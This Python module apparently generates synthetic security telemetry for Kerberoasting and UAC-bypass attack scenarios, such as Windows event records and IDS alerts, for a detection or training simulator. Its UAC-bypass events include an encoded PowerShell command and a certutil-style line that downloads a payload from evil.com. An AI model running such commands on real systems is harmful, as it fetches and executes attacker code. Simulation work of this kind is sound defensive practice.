import random
from typing import Any, Dict, List

from src.attacks.base import AttackScenario, MITREMapping, AttackPhase


class KerberoastingAttack(AttackScenario):
    def __init__(self):
        super().__init__(
            name="Kerberoasting",
            description="Requesting TGS for services to crack passwords offline.",
            mitre_mappings=[
                MITREMapping(
                    technique_id="T1558.003",
                    technique_name="Kerberoasting",
                    tactic="Credential Access",
                    phase=AttackPhase.CREDENTIAL_ACCESS
                )
            ],
            severity=4
        )

    def generate_events(self, sim_time: float, rng: random.Random, **kwargs) -> List[Dict[str, Any]]:
        attacker_ip = kwargs.get("attacker_ip", "10.0.1.100")
        dc_ip = kwargs.get("dc_ip", "10.0.1.5")
        dc_hostname = kwargs.get("dc_hostname", "dc01")
        compromised_user = kwargs.get("compromised_user", "jdoe")
        target_spns = kwargs.get("target_spns", ["MSSQLSvc/db01.mil.local:1433", "HTTP/web01.mil.local"])
        
        events = []
        current_time = sim_time
        
        for spn in target_spns:
            # Event 4769
            events.append({
                "timestamp": current_time,
                "event_type": "raw.endpoint",
                "data": {
                    "event_id": 4769,
                    "hostname": dc_hostname,
                    "user": compromised_user,
                    "service_name": spn,
                    "ticket_encryption_type": "0x17",
                    "src_ip": attacker_ip
                }
            })
            
            # IDS Alert
            events.append({
                "timestamp": current_time,
                "event_type": "raw.ids",
                "data": {
                    "alert": "ET EXPLOIT Possible Kerberoasting Ticket Request",
                    "src_ip": attacker_ip,
                    "dest_ip": dc_ip,
                    "severity": 4
                }
            })
            
            # Conn log
            events.append({
                "timestamp": current_time,
                "event_type": "raw.network",
                "data": {
                    "src_ip": attacker_ip,
                    "dest_ip": dc_ip,
                    "dest_port": 88,
                    "proto": "udp",
                }
            })
            
            current_time += rng.uniform(1.0, 3.0)
            
        return events


class UACBypassAttack(AttackScenario):
    def __init__(self):
        super().__init__(
            name="UAC Bypass",
            description="Bypassing User Account Control to escalate privileges.",
            mitre_mappings=[
                MITREMapping(
                    technique_id="T1548.002",
                    technique_name="Bypass User Account Control",
                    tactic="Privilege Escalation",
                    phase=AttackPhase.PRIVILEGE_ESCALATION
                )
            ],
            severity=4
        )

    def generate_events(self, sim_time: float, rng: random.Random, **kwargs) -> List[Dict[str, Any]]:
        hostname = kwargs.get("hostname", "wkstn01")
        compromised_user = kwargs.get("compromised_user", "jdoe")
        domain = kwargs.get("domain", "mil.local")
        
        events = []
        current_time = sim_time
        
        events.append({
            "timestamp": current_time,
            "event_type": "raw.endpoint",
            "data": {
                "event_id": 1,
                "hostname": hostname,
                "user": f"{domain}\\{compromised_user}",
                "process": "powershell.exe",
                "parent_process": "cmd.exe",
                "command_line": "powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA..."
            }
        })
        current_time += rng.uniform(2.0, 5.0)
        
        events.append({
            "timestamp": current_time,
            "event_type": "raw.endpoint",
            "data": {
                "event_id": 4672,
                "hostname": hostname,
                "user": f"{domain}\\{compromised_user}",
                "privileges": "SeDebugPrivilege, SeImpersonatePrivilege"
            }
        })
        current_time += rng.uniform(2.0, 5.0)
        
        suspicious_child = rng.choice(["certutil.exe", "bitsadmin.exe", "vssadmin.exe"])
        events.append({
            "timestamp": current_time,
            "event_type": "raw.endpoint",
            "data": {
                "event_id": 1,
                "hostname": hostname,
                "user": f"{domain}\\{compromised_user}",
                "process": suspicious_child,
                "parent_process": "powershell.exe",
                "command_line": f"{suspicious_child} -urlcache -split -f http://evil.com/payload.exe payload.exe"
            }
        })
        
        return events
